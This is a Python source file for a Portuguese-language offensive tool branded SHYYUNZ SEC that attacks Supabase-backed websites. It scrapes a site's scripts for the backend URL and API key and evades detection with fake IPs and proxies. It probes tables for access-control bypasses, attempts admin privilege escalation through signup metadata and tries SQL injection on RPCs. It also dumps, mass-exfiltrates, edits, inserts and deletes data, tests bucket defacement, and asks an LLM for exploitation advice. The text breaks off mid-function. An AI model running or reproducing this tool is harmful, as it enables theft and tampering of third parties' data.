#!/usr/bin/env python3
import asyncio
import httpx
import json
import re
import time
import base64
from openai import OpenAI
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.live import Live
from rich.align import Align
from rich.syntax import Syntax
import os
import random
import string
import sys
from typing import List, Optional, Set, Dict
from urllib.parse import urljoin
import warnings
warnings.filterwarnings("ignore")

# --- CONFIGURAÇÃO VISUAL SHYYUNZ SEC ---
console = Console()

BANNER = """
[bold cyan]
 ██████╗██╗  ██╗██╗   ██╗██╗   ██╗███╗   ██╗███████╗
██╔════╝██║  ██║╚██╗ ██╔╝╚██╗ ██╔╝████╗  ██║╚══███╔╝
╚█████╗ ███████║ ╚████╔╝  ╚████╔╝ ██╔██╗ ██║  ███╔╝ 
 ╚═══██╗██╔══██║  ╚██╔╝    ╚██╔╝  ██║╚██╗██║ ███╔╝  
██████╔╝██║  ██║   ██║      ██║   ██║ ╚████║███████╗
╚═════╝ ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═══╝╚══════╝
[/bold cyan][bold magenta] ╔═════════════════════════════════════════════════════╗
 ║ [bold white]SHYYUNZ SEC - SUPABASE v2.0[/bold white]       ║
 ║ [dim]Shadow Ops & Ultimate Exploit Edition[/dim]   ║
 ╚═════════════════════════════════════════════════════╝[/bold magenta]
"""

BRANDED_BANNER = r"""
[bold cyan]
                  ___====-_  _-====___
            _--^^^#####//      \\#####^^^--_
         _-^##########// (    ) \\##########^-_
        -############//  |\^^/|  \\############-
      _/############//   (@::@)   \\############\_
     /#############((     \\//     ))#############\
    -###############\\    (oo)    //###############-
   -#################\\  / VV \  //#################-
  -###################\\/      \//###################-
 _#/|##########/\######(   /\   )######/\##########|\#_
 |/ |#/\#/\#/\/  \#/\##\  |  |  /#/\#/  \/\#/\#/\#| \|
 `  |/  V  V  `   V  \# \ |  | / #/  V   '  V  V  \|  '
     `   `  `      `   /  \_|  |_/  \   '      '  '   '
                     /            \\
                    |   [bold white]SHYYUNZ[/bold white]   |
                     \____________/
[/bold cyan]
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
]

class KnowledgeManager:
    def __init__(self, filename="sh_knowledge.json"):
        self.filename = filename
        self.data = self.load()
    def load(self):
        if os.path.exists(self.filename):
            try:
                with open(self.filename, "r") as f: return json.load(f)
            except: pass
        return {"tables": [], "rpcs": [], "buckets": []}
    def save(self):
        try:
            with open(self.filename, "w") as f: json.dump(self.data, f, indent=2)
        except: pass
    def learn(self, category: str, name: str):
        if name not in self.data[category]:
            self.data[category].append(name)
            self.save()

knowledge = KnowledgeManager()

class ConfigManager:
    """Gerencia as configurações locais do usuário (API Keys, etc)."""
    def __init__(self, filename=".sh_config.json"):
        # Usa caminho absoluto para garantir que salve sempre no mesmo lugar (pasta do usuário)
        self.filename = os.path.join(os.path.expanduser("~"), filename)
        self.config = self.load()

    def load(self):
        if os.path.exists(self.filename):
            try:
                with open(self.filename, "r") as f: return json.load(f)
            except: pass
        return {"gemini_api_key": None}

    def save(self):
        try:
            with open(self.filename, "w") as f: json.dump(self.config, f, indent=2)
        except: pass

    def get_api_key(self):
        key = self.config.get("ai_api_key")
        if key and (key.startswith("sk-") or key.startswith("AIzaSy")): return key
        return None

    def set_api_key(self, key: str):
        key = key.strip()
        if key.startswith("sk-") or key.startswith("AIzaSy"):
            self.config["ai_api_key"] = key
            self.save()
            return True
        return False

sh_config = ConfigManager()

class ShyyunzBrain:
    def __init__(self, api_key: str):
        self.client = OpenAI(api_key=api_key)
        self.model = 'gpt-4o-mini'

    async def _chat(self, prompt: str) -> str:
        """Envia prompt para a OpenAI com retry para rate limits."""
        try:
            response = await asyncio.to_thread(
                self.client.chat.completions.create,
                model=self.model,
                messages=[{"role": "user", "content": prompt}],
                max_tokens=1000
            )
            return response.choices[0].message.content
        except Exception as e:
            if "429" in str(e):
                console.print("[dim][IA] Rate limit, aguardando 5s...[/dim]")
                await asyncio.sleep(5)
                response = await asyncio.to_thread(
                    self.client.chat.completions.create,
                    model=self.model,
                    messages=[{"role": "user", "content": prompt}],
                    max_tokens=1000
                )
                return response.choices[0].message.content
            raise e

    async def analyze_data(self, table_name: str, data: List[Dict]):
        if not data: return "Nenhum dado para analisar."
        sample = json.dumps(data[:10], indent=2)
        prompt = f"Você é o Cérebro Analítico da SHYYUNZ SEC. Analise este DUMP da tabela '{table_name}'. Identifique:\n1. Dados Sensíveis (Senhas, Hashes, Tokens, E-mails de Admins)\n2. Nível de Impacto (Baixo, Médio, Crítico)\n3. Recomendações de Exploração\nResponda em PORTUGUÊS BRASIL.\n\nDADOS:\n{sample}"
        try:
            return await self._chat(prompt)
        except Exception as e: return f"[red]Erro IA: {e}[/red]"

    async def suggest_filters(self, table_name: str) -> List[str]:
        prompt = f"Sugira 3 filtros PostgREST para burlar RLS na tabela '{table_name}'. Apenas os filtros separados por vírgula, sem explicação."
        try:
            text = await self._chat(prompt)
            return [f.strip() for f in text.split(",") if "=" in f]
        except: return ["id=not.eq.0", "limit=1"]

class ShyyunzAuditor:
    def __init__(self, target: str, apikey: str, bearer: Optional[str] = None):
        self.project_ref = self.extract_project_ref(target)
        self.root_url = f"https://{self.project_ref}.supabase.co"
        self.base_url = f"{self.root_url}/rest/v1/"
        self.auth_url = f"{self.root_url}/auth/v1/"
        self.storage_url = f"{self.root_url}/storage/v1/"
        self.apikey = apikey.strip()
        self.bearer = bearer.strip() if bearer else self.apikey
        self.headers = {"apikey": self.apikey, "Authorization": f"Bearer {self.bearer}", "Content-Type": "application/json"}
        self.results = []
        self.graphql_discovered = set()
        self.semaphore = asyncio.Semaphore(60)
        self.hits_count = 0
        self.proxies = self.load_proxies()
        self.current_proxy = None

    def load_proxies(self):
        if os.path.exists("proxies.txt"):
            try:
                with open("proxies.txt", "r") as f: return [l.strip() for l in f if l.strip()]
            except: pass
        return []

    def rotate_headers(self):
        new_ua = random.choice(USER_AGENTS)
        fake_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        self.headers.update({"User-Agent": new_ua, "X-Forwarded-For": fake_ip})
        if self.proxies: self.current_proxy = random.choice(self.proxies)

    @staticmethod
    def extract_project_ref(target: str) -> str:
        if "supabase.co" in target:
            m = re.findall(r"https?://([a-z0-9-]+)\.supabase\.co", target)
            if m: return m[0]
        return target.replace("https://", "").replace("http://", "").split(".")[0]

    async def check_service_role(self):
        async with httpx.AsyncClient() as client:
            try:
                r = await client.get(f"{self.auth_url}admin/users", headers=self.headers, timeout=5.0)
                if r.status_code == 200: console.print("[bold red blink][!!!] CHAVE SERVICE_ROLE DETECTADA! [!!!][/bold red blink]")
            except: pass

    async def pre_scan_auth_check(self) -> bool:
        async with httpx.AsyncClient(timeout=10.0) as client:
            try:
                r = await client.get(f"{self.base_url}auth_check", headers=self.headers)
                if r.status_code == 401: console.print("[red][!] ERRO: 401 Unauthorized.[/red]"); return False
                return True
            except: return False

    async def perform_intelligence_gathering(self):
        console.print("\n[bold yellow]>>> COLETA DE INTELIGÊNCIA <<<[/bold yellow]")
        try:
            async with httpx.AsyncClient() as client:
                r = await client.get(f"{self.auth_url}settings", headers={"apikey": self.apikey}, timeout=10.0)
                if r.status_code == 200 and not r.json().get("disable_signup", True): console.print("  [bold red][!] VULN: Signup Público Aberto![/bold red]")
                gr = await client.post(f"{self.root_url}/graphql/v1", headers=self.headers, json={"query": "{ __schema { types { name } } }"})
                if gr.status_code == 200:
                    for t in gr.json()["data"]["__schema"]["types"]:
                        n = t.get("name").lower()
                        if not n.startswith("__"): self.graphql_discovered.add(n); knowledge.learn("tables", n)
                    console.print(f"  [bold green][+] GQL EXPOSED: {len(self.graphql_discovered)} alvos vazados.[/bold green]")
        except: pass

    async def perform_active_write_test(self, client, table_name):
        res = {"post": False, "patch": False, "delete": False}
        h = self.headers.copy(); h["Prefer"] = "return=minimal"
        try:
            if (await client.post(f"{self.base_url}{table_name}", headers=h, json={"sh": "1"})).status_code in [201, 400]: res["post"] = True
            if (await client.patch(f"{self.base_url}{table_name}?id=eq.0", headers=h, json={"sh": "1"})).status_code in [200, 204, 400]: res["patch"] = True
            if (await client.delete(f"{self.base_url}{table_name}?id=eq.0", headers=h)).status_code in [200, 204, 400]: res["delete"] = True
        except: pass
        return res

    async def create_account(self, email: str, password: str, metadata: dict = None):
        """Cria uma conta no Supabase Auth e retorna o token se sucesso."""
        body = {"email": email, "password": password}
        if metadata: body["data"] = metadata
        async with httpx.AsyncClient() as client:
            try:
                r = await client.post(f"{self.auth_url}signup", headers={"apikey": self.apikey, "Content-Type": "application/json"}, json=body, timeout=10.0)
                data = r.json()
                if r.status_code in [200, 201]:
                    token = data.get('access_token')
                    if token:
                        console.print(f"[bold green][+] Conta criada com sucesso! Email: {email} Senha: {password}[/bold green]")
                        return token
                    else:
                        console.print(f"[yellow][!] Conta criada, mas sem token (confirmação por e-mail pode estar ativada).[/yellow]")
                        console.print(f"[dim]    Resposta: {json.dumps(data, indent=2)[:300]}[/dim]")
                        return None
                else:
                    msg = data.get('msg') or data.get('error_description') or data.get('message') or str(data)
                    console.print(f"[red][!] Falha ao criar conta ({r.status_code}): {msg}[/red]")
                    return None
            except Exception as e:
                console.print(f"[red][!] Erro de conexão: {e}[/red]")
                return None

    async def exploit_escalation(self):
        console.print("\n[bold cyan][*] Iniciando Sniper de Escalonamento (5 payloads)...[/bold cyan]")
        payloads = [
            {"role": "admin"},
            {"is_admin": True},
            {"app_metadata": {"role": "admin"}},
            {"user_metadata": {"role": "admin"}},
            {"claims": {"role": "admin"}}
        ]
        success = False
        for i, p in enumerate(payloads, 1):
            email = f"admin{random.randint(1000,9999)}@shyyunz.sec"
            console.print(f"[dim]  [{i}/5] Testando payload: {json.dumps(p)}...[/dim]")
            token = await self.create_account(email, "Shyyunz2.0", p)
            if token:
                console.print(f"[bold green][!!!] ESCALONAMENTO BEM-SUCEDIDO com payload: {json.dumps(p)}[/bold green]")
                self.bearer = token
                self.headers["Authorization"] = f"Bearer {token}"
                success = True
                break
        if not success:
            console.print("[yellow][!] Nenhum escalonamento funcionou neste alvo.[/yellow]")
        return success

    async def rpc_sniper(self, brain: Optional[ShyyunzBrain] = None):
        console.print("\n[bold magenta][*] Iniciando RPC Sniper & SQLi Probe...[/bold magenta]")
        async with httpx.AsyncClient(headers=self.headers) as client:
            for rpc in list(set(["get_users", "admin_stats", "get_config"] + knowledge.data["rpcs"])):
                r = await client.post(f"{self.root_url}/rest/v1/rpc/{rpc}", json={})
                if r.status_code in [200, 204]:
                    console.print(f"[bold red][!] RPC EXPOSTO: {rpc}[/bold red]")
                    knowledge.learn("rpcs", rpc)
                    if brain: console.print(Panel(await brain.analyze_data(f"RPC_{rpc}", r.json() if r.status_code == 200 else []), title=f"IA: {rpc}"))
                    for sqli in [{"query": "SELECT version()"}, {"sql": "SELECT datname FROM pg_database"}]:
                        sr = await client.post(f"{self.root_url}/rest/v1/rpc/{rpc}", json=sqli)
                        if sr.status_code == 200 and ("PostgreSQL" in sr.text or "pg_database" in sr.text):
                            console.print(f"[bold red blink][!!!] SQL INJECTION DETECTADO EM RPC: {rpc}[/bold red blink]")

    async def deep_bucket_scan(self):
        console.print("\n[bold cyan][*] Iniciando Deep Bucket Scan...[/bold cyan]")
        async with httpx.AsyncClient(headers=self.headers) as client:
            for b in list(set(["avatars", "backups", "public", "profiles"] + knowledge.data["buckets"])):
                if (await client.get(f"{self.storage_url}bucket/{b}")).status_code == 200: console.print(f"[bold red][!] BUCKET ABERTO: {b}[/bold red]")
                if (await client.post(f"{self.storage_url}object/{b}/shy.txt", files={"file": ("shy.txt", b"VULN")})).status_code in [200, 201]: console.print(f"[bold red blink][!!!] BUCKET ESCRITA (DEFACEMENT): {b}[/bold red blink]")

    async def check_target(self, client, target, t_type, progress, task_id, brain=None):
        async with self.semaphore:
            self.rotate_headers(); url = f"{self.base_url}{target}" if t_type == "TABLE" else f"{self.storage_url}bucket/{target}"
            try:
                readable, has_data, bypass = False, False, None
                if t_type == "TABLE":
                    r = await client.get(f"{url}?select=*", headers=self.headers, params={"limit": 1})
                    readable = (r.status_code == 200)
                    if not readable:
                        rj = await client.get(f"{url}?select=*,auth.users(*)", headers=self.headers, params={"limit": 1})
                        if rj.status_code == 200: readable, bypass = True, "JOIN Inj"
                        # Filtros estáticos de bypass (sem gastar cota da IA)
                        if not readable:
                            static_filters = ["id=not.eq.0", "limit=1", "id=gte.0", "created_at=not.is.null", "order=id.asc"]
                            for sf in static_filters:
                                rf = await client.get(f"{url}?select=*&{sf}", headers=self.headers)
                                if rf.status_code == 200 and len(rf.text) > 2: readable, bypass = True, f"Bypass ({sf})"; break
                    if readable: 
                        try: 
                            rd = await client.get(f"{url}?select=*", headers=self.headers, params={"limit": 1})
                            has_data = len(rd.json()) > 0
                        except: pass
                        knowledge.learn("tables", target)
                    wv = await self.perform_active_write_test(client, target)
                    self.results.append({"type": t_type, "name": target, "readable": readable, "has_data": has_data, "bypass": bypass, "writes": wv})
                elif t_type == "BUCKET" and (await client.get(url, headers=self.headers)).status_code == 200:
                    self.results.append({"type": "BUCKET", "name": target, "readable": True}); knowledge.learn("buckets", target)
                
                if readable: self.hits_count += 1
                progress.update(task_id, description=f"[bold red]Auditoria V8.0: [ACERTOS {self.hits_count}] ")
            except: pass
            finally: progress.advance(task_id)

    async def run_scan(self, tables, brain=None):
        async with httpx.AsyncClient(verify=False, http2=True, timeout=10.0) as client:
            with Progress(
                SpinnerColumn(), 
                TextColumn("[progress.description]{task.description}"), 
                BarColumn(bar_width=40), 
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), 
                console=console
            ) as progress:
                task = progress.add_task("[bold red]Shadow Ops Recon...", total=len(tables))
                await asyncio.gather(*[self.check_target(client, t, "TABLE", progress, task, brain) for t in tables])

async def fetch_supabase_details(url: str):
    if not url.startswith("http"): url = "https://" + url
    for attempt in range(2):  # Retry uma vez se falhar
        try:
            async with httpx.AsyncClient(headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=15.0, follow_redirects=True, verify=False) as client:
                console.print(f"[dim][*] Analisando: {url}...[/dim]")
                r = await client.get(url)
                if r.status_code != 200:
                    console.print(f"[dim][!] Status {r.status_code}, tentando novamente...[/dim]")
                    await asyncio.sleep(2)
                    continue
                html = r.text
                # Captura <script src="..."> E <link rel="modulepreload" href="...">
                scripts = re.findall(r'<script[^>]*?src=["\'](.*?\.js[^"\']*)["\']', html)
                preloads = re.findall(r'<link[^>]*?rel=["\']modulepreload["\'][^>]*?href=["\'](.*?\.js[^"\']*)["\']', html)
                js_urls = list(set(
                    [urljoin(url, s) for s in scripts + preloads] +
                    [urljoin(url, p) for p in ["js/config.js", "config.js", "supabase.js"]]
                ))
                u_p = r'https://[a-z0-9\-]+\.supabase\.(co|net)'
                k_p = r'(eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9.\-_]{50,}|sb_publishable_[a-zA-Z0-9\-_]{20,}|pk_[a-zA-Z0-9\-_]{20,})'
                t = re.search(u_p, html)
                k = re.search(k_p, html)
                target = t.group(0) if t else None
                apikey = k.group(0) if k else None
                if not target or not apikey:
                    for j in js_urls:
                        try:
                            jr = await client.get(j, timeout=8.0)
                            if jr.status_code == 200 and len(jr.text) > 100:
                                if not target:
                                    mt = re.search(u_p, jr.text)
                                    target = mt.group(0) if mt else None
                                if not apikey:
                                    mk = re.search(k_p, jr.text)
                                    apikey = mk.group(0) if mk else None
                                if target and apikey: break
                        except: continue
                if target and apikey:
                    console.print(f"[bold green][+] Supabase Detectado: {target}[/bold green]")
                    return target, apikey
                elif attempt == 0:
                    console.print("[dim][!] Detecção parcial, tentando novamente...[/dim]")
                    await asyncio.sleep(1)
        except Exception as e:
            if attempt == 0:
                console.print(f"[dim][!] Erro de rede ({e}), tentando novamente...[/dim]")
                await asyncio.sleep(2)
    console.print("[yellow][!] Detecção automática falhou.[/yellow]")
    return None, None

def prompt_payload():
    console.print("[dim]  Formato: coluna=valor (uma por linha)[/dim]")
    console.print("[dim]  Exemplo: name=João    ou    status=paid    ou    age=25[/dim]")
    console.print("[dim]  Digite 'OK' para enviar ou 'CANCELAR' para sair.[/dim]")
    payload = {}
    while True:
        entry = input(f"  [{len(payload)+1}] ").strip()
        if not entry or entry.upper() == "CANCELAR": 
            if not payload: return None
            break
        if entry.upper() == "OK": break
        if "=" not in entry:
            console.print("[red]    Use o formato coluna=valor (ex: status=paid)[/red]")
            continue
        parts = entry.split("=", 1)
        col, val = parts[0].strip(), parts[1].strip()
        # Tenta converter números
        if val.isdigit(): val = int(val)
        elif val.lower() in ["true", "false"]: val = val.lower() == "true"
        payload[col] = val
        console.print(f"[green]    ✓ {col} = {val}[/green]")
    return payload if payload else None

async def audit_routine():
    console.print(Align.center(BRANDED_BANNER))
    console.print(Align.center(Panel.fit("[bold magenta]SUPABASE AUDITOR v2.0 - SHADOW OPS[/bold magenta]", border_style="cyan")))
    site_url = console.input("\n[bold cyan][🌐 SHY_SEC] URL:[/bold cyan] ").strip()
    
    # Sanitização: Remove caracteres de controle (como ^H/\x08) e conserta "https://https://"
    site_url = "".join(ch for ch in site_url if ch.isprintable())
    site_url = site_url.replace("https://https://", "https://").replace("http://http://", "http://")
    
    if site_url.lower() in ["0", "sair", "exit"]: return False
    target, apikey = await fetch_supabase_details(site_url)
    
    ai_key = sh_config.get_api_key()
    brain = ShyyunzBrain(ai_key) if ai_key else None
    
    if not target or not apikey:
        target = input("URL Supabase: ").strip(); apikey = input("API Key: ").strip()
        if not target or not apikey: return True
    
    # Prompt opcional de Bearer Authentication
    console.print(f"\n[bold green][+] Alvo: {target}[/bold green]")
    bearer_token = None
    use_bearer = input("[🔑] Adicionar Bearer Token? (S/N): ").strip().upper()
    if use_bearer == "S":
        bearer_token = input("[🔑] Bearer Token (JWT): ").strip()
        if bearer_token:
            console.print(f"[bold green][+] Autenticado! Token: {bearer_token[:20]}...{bearer_token[-10:]}[/bold green]")
        else:
            console.print("[dim]Token vazio, rodando sem autenticação.[/dim]")
            bearer_token = None
    else:
        console.print("[dim]Rodando scan sem autenticação extra.[/dim]")
    
    auditor = ShyyunzAuditor(target, apikey, bearer_token)
    await auditor.pre_scan_auth_check(); await auditor.perform_intelligence_gathering()
    words = list(set(["users", "profiles", "accounts", "admins", "settings", "orders", "config", "roles", "secrets", "api_keys", "payments", "logs"] + list(auditor.graphql_discovered) + knowledge.data["tables"]))
    await auditor.run_scan(words, brain)
    
    table_map = {}
    sum_t = Table(title="[bold red]VETORES DE EXPLORAÇÃO SELECIONADOS[/bold red]")
    sum_t.add_column("Nr."); sum_t.add_column("Alvo"); sum_t.add_column("Leitura"); sum_t.add_column("Escrita (W/U/D)"); sum_t.add_column("Status")
    for i, r in enumerate(auditor.results, 1):
        read_s = "[dim]RLS[/dim]"
        if r.get('readable'): read_s = "[bold green]EXPOSTO (DADOS)[/bold green]" if r.get('has_data') else "[bold yellow]EXPOSTO (VAZIA)[/bold yellow]"
        wv = r.get('writes', {"post":False,"patch":False,"delete":False})
        write_s = f"[{'W' if wv['post'] else '-'}/{'U' if wv['patch'] else '-'}/{'D' if wv['delete'] else '-'}]"
        st = "[bold red]CRÍTICO[/bold red]" if r.get('readable') or any(wv.values()) else "[yellow]ALTO[/yellow]"
        sum_t.add_row(str(i), r['name'], read_s, write_s + (f" ({r['bypass']})" if r.get('bypass') else ""), st)
        table_map[str(i)] = r
    console.print(sum_t)

    while True:
        menu_text = (
            "[bold cyan]DADOS E EXFILTRAÇÃO[/bold cyan]\n"
            "[white][1] Ver Dados (Dump)    [D] Sugar Tudo (Mass Exfil)[/white]\n\n"
            "[bold cyan]ATAQUE E ESCRITA[/bold cyan]\n"
            "[white][6] Inserir (POST)      [7] Editar (PATCH)    [8] Deletar (DEL)[/white]\n"
            "[white][3] Criar Conta         [9] Login Anônimo     [E] Escalar Privilégios[/white]\n\n"
            "[bold cyan]EXPLORAÇÃO PROFUNDA[/bold cyan]\n"
            "[white][R] Scan de RPCs        [B] Scan de Buckets   [K] Config / Brain[/white]\n\n"
            "[bold red][0] Voltar / Novo Alvo[/bold red]"
        )
        console.print(Panel(menu_text, title="PAINEL DE OPERAÇÕES", border_style="cyan"))
        c = input("\n[SHY_OPS] Ação: ").strip().upper()
        
        if c == "0":
            return True

        elif c == "1":
            idx = input("Nr. do alvo: ").strip()
            if idx in table_map:
                try:
                    async with httpx.AsyncClient() as cl:
                        r = await cl.get(f"{auditor.base_url}{table_map[idx]['name']}?select=*", headers=auditor.headers, params={"limit": 10})
                        data = r.json()
                        console.print(Panel(json.dumps(data, indent=2), title=f"Dump: {table_map[idx]['name']}"))
                        if brain and data and input("\n[?] Analisar com IA? (S/N): ").strip().upper() == "S":
                            console.print("[dim][*] Enviando para o Cérebro Analítico...[/dim]")
                            analysis = await brain.analyze_data(table_map[idx]['name'], data)
                            console.print(Panel(analysis, title="ANÁLISE IA", border_style="magenta"))
                except Exception as e:
                    console.print(f"[red]Erro ao ler dados: {e}[/red]")
            else:
                console.print("[red]Número inválido.[/red]")

        elif c == "3":
            console.print("\n[bold cyan]--- CRIAR CONTA ---[/bold cyan]")
            email = input("E-mail: ").strip()
            password = input("Senha (mín 6 chars): ").strip()
            nickname = input("Nickname/Nome (Enter p/ pular): ").strip()
            if not email or not password:
                console.print("[red]E-mail e senha são obrigatórios.[/red]")
                continue
            meta = {}
            if nickname: meta["nickname"] = nickname; meta["name"] = nickname
            token = await auditor.create_account(email, password, meta if meta else None)
            if token:
                auditor.bearer = token
                auditor.headers["Authorization"] = f"Bearer {token}"
                console.print("[bold green][+] Token ativo! Você está logado com esta conta.[/bold green]")

        elif c == "6":
            idx = input("Nr. do alvo: ").strip()
            if idx not in table_map:
                console.print("[red]Número inválido.[/red]")
            else:
                tabela = table_map[idx]['name']
                console.print(f"\n[bold cyan]--- INSERIR em '{tabela}' ---[/bold cyan]")
                try:
                    async with httpx.AsyncClient() as cl:
                        r = await cl.get(f"{auditor.base_url}{tabela}?select=*", headers=auditor.headers, params={"limit": 1})
                        sample = r.json()
                    cols = []
                    if sample and isinstance(sample, list):
                        cols = list(sample[0].keys())
                        console.print(f"[bold yellow]Colunas disponíveis:[/bold yellow]")
                        for ci, col in enumerate(cols, 1):
                            val = sample[0][col]
                            tipo = "JSON" if isinstance(val, dict) else "lista" if isinstance(val, list) else type(val).__name__ if val is not None else "?"
                            console.print(f"  [white][{ci}][/white] {col} [dim]({tipo})[/dim]")
                    console.print(f"\n[bold cyan]Digite os dados separados por vírgula:[/bold cyan]")
                    console.print("[dim]  coluna=valor, coluna=valor[/dim]")
                    console.print("[dim]  Exemplo: name=João, email=joao@mail.com, status=active[/dim]")
                    raw = input("\n  Dados: ").strip()
                    if raw and raw.upper() != "CANCELAR":
                        payload = {}
                        for part in raw.split(","):
                            part = part.strip()
                            if "=" not in part: continue
                            col, val = part.split("=", 1)
                            col = col.strip(); val = val.strip()
                            if val.isdigit(): val = int(val)
                            elif val.lower() in ["true", "false"]: val = val.lower() == "true"
                            payload[col] = val
                            console.print(f"[green]  ✓ {col} = {val}[/green]")
                        if payload:
                            console.print(f"\n[dim]Payload: {json.dumps(payload, ensure_ascii=False)}[/dim]")
                            ok = input("\nInserir? (S/N): ").strip().upper()
                            if ok == "S":
                                async with httpx.AsyncClient() as cl2:
                                    res = await cl2.post(f"{auditor.base_url}{tabela}", headers={**auditor.headers, "Prefer": "return=representation"}, json=payload)
                                if res.status_code in [200, 201]:
                                    console.print(f"[bold green][+] INSERIDO COM SUCESSO! ({res.status_code})[/bold green]")
                                else:
                                    console.print(f"[red]Erro ({res.status_code}): {res.text[:300]}[/red]")
                            else:
                                console.print("[yellow]Cancelado.[/yellow]")
                except Exception as e:
                    console.print(f"[red]Erro: {e}[/red]")

        elif c == "7":
            idx = input("Nr. do alvo: ").strip()
            if idx not in table_map:
                console.print("[red]Número inválido.[/red]")
            else:
                tabela = table_map[idx]['name']
                console.print(f"\n[bold cyan]--- EDITOR: '{tabela}' ---[/bold cyan]")
                try:
                    async with httpx.AsyncClient() as cl:
                        r = await cl.get(f"{auditor.base_url}{tabela}?select=*", headers=auditor.headers, params={"limit": 20})
                        rows = r.json()
                    if not rows or not isinstance(rows, list):
                        console.print("[red]Nenhum dado encontrado.[/red]")
                    else:
                        id_col = None
                        for col_name in ["id", "key", "uuid", "uid", "name", "slug"]:
                            if col_name in rows[0]: id_col = col_name; break
                        if not id_col: id_col = list(rows[0].keys())[0]
                        console.print(f"\n[bold yellow]Registros ({len(rows)}):[/bold yellow]")
                        for ri, row in enumerate(rows, 1):
                            label = row.get(id_col, "?")
                            if isinstance(label, dict): label = json.dumps(label)[:60]
                            console.print(f"  [cyan][{ri}][/cyan] {id_col}=[bold]{str(label)[:80]}[/bold]")
                        pick = input(f"\nQual editar? (1-{len(rows)}): ").strip()
                        if not pick.isdigit() or int(pick) < 1 or int(pick) > len(rows):
                            console.print("[red]Número inválido.[/red]")
                        else:
                            selected = rows[int(pick) - 1]
                            filtro = f"{id_col}=eq.{selected[id_col]}"
                            flat_fields = {}
                            fn = 1
                            console.print(f"\n[bold yellow]Campos:[/bold yellow]")
                            for col, val in selected.items():
                                if isinstance(val, dict):
                                    console.print(f"  [cyan]{col}[/cyan] (JSON):")
                                    for sk, sv in val.items():
                                        flat_fields[str(fn)] = (col, sk, sv)
                                        console.print(f"    [white][{fn}][/white] {sk} = [dim]{str(sv)[:60] if sv else '[vazio]'}[/dim]")
                                        fn += 1
                                else:
                                    flat_fields[str(fn)] = (col, None, val)
                                    console.print(f"  [white][{fn}][/white] {col} = [dim]{str(val)[:60] if val else '[vazio]'}[/dim]")
                                    fn += 1
                            console.print(f"\n[bold cyan]Digite as edições separadas por vírgula:[/bold cyan]")
                            console.print("[dim]  Formato: numero=valor, numero=valor[/dim]")
                            console.print("[dim]  Exemplo: 5=shyyunz, 3=Rua Nova 123[/dim]")
                            raw = input("\n  Edições: ").strip()
                            if raw and raw.upper() != "CANCELAR":
                                changes = {}
                                json_changes = {}
                                for part in raw.split(","):
                                    part = part.strip()
                                    if "=" not in part: continue
                                    num, new_val = part.split("=", 1)
                                    num = num.strip(); new_val = new_val.strip()
                                    if num not in flat_fields:
                                        console.print(f"[red]  Campo [{num}] não existe, ignorado.[/red]")
                                        continue
                                    col, sub_key, old_val = flat_fields[num]
                                    if sub_key:
                                        if col not in json_changes:
                                            json_changes[col] = dict(selected[col])
                                        json_changes[col][sub_key] = new_val
                                        console.print(f"[green]  ✓ {col}.{sub_key} → {new_val}[/green]")
                                    else:
                                        if new_val.isdigit(): new_val = int(new_val)
                                        elif new_val.lower() in ["true", "false"]: new_val = new_val.lower() == "true"
                                        changes[col] = new_val
                                        console.print(f"[green]  ✓ {col} → {new_val}[/green]")
                                payload = {**changes, **json_changes}
                                if payload:
                                    console.print(f"\n[dim]Filtro: {filtro}[/dim]")
                                    console.print(f"[dim]Dados: {json.dumps(payload, ensure_ascii=False)}[/dim]")
                                    ok = input("\nConfirmar? (S/N): ").strip().upper()
                                    if ok == "S":
                                        patch_headers = {**auditor.headers, "Prefer": "return=representation"}
                                        async with httpx.AsyncClient() as cl2:
                                            res = await cl2.patch(f"{auditor.base_url}{tabela}?{filtro}", headers=patch_headers, json=payload)
                                        if res.status_code in [200, 201]:
                                            body = res.json() if res.text else []
                                            if body:
                                                console.print(f"[bold green][+] EDITADO COM SUCESSO! ({res.status_code}) - {len(body)} registro(s) alterado(s)[/bold green]")
                                                console.print(f"[dim]Resposta: {json.dumps(body[0] if isinstance(body, list) else body, ensure_ascii=False)[:300]}[/dim]")
                                            else:
                                                console.print(f"[bold red][!] PATCH retornou {res.status_code} mas NENHUM registro foi alterado![/bold red]")
                                                console.print("[yellow]    Possível causa: RLS (Row Level Security) bloqueou a escrita.[/yellow]")
                                                console.print("[yellow]    Tente criar uma conta e logar primeiro (opção [3]).[/yellow]")
                                        elif res.status_code == 204:
                                            console.print(f"[yellow][!] Servidor retornou 204 (sem corpo). Não é possível confirmar se alterou.[/yellow]")
                                            console.print("[dim]    Use [1] Ver Dados para verificar manualmente.[/dim]")
                                        else:
                                            console.print(f"[red]Erro ({res.status_code}): {res.text[:300]}[/red]")
                                    else:
                                        console.print("[yellow]Cancelado.[/yellow]")
                except Exception as e:
                    console.print(f"[red]Erro: {e}[/red]")

        elif c == "8":
            idx = input("Nr. do alvo: ").strip()
            if idx not in table_map:
                console.print("[red]Número inválido.[/red]")
            else:
                tabela = table_map[idx]['name']
                console.print(f"\n[bold red]--- DELETAR de '{tabela}' ---[/bold red]")
                try:
                    async with httpx.AsyncClient() as cl:
                        r = await cl.get(f"{auditor.base_url}{tabela}?select=*", headers=auditor.headers, params={"limit": 20})
                        rows = r.json()
                    if not rows or not isinstance(rows, list):
                        console.print("[red]Nenhum dado encontrado.[/red]")
                    else:
                        id_col = None
                        for col_name in ["id", "key", "uuid", "uid", "name", "slug"]:
                            if col_name in rows[0]: id_col = col_name; break
                        if not id_col: id_col = list(rows[0].keys())[0]
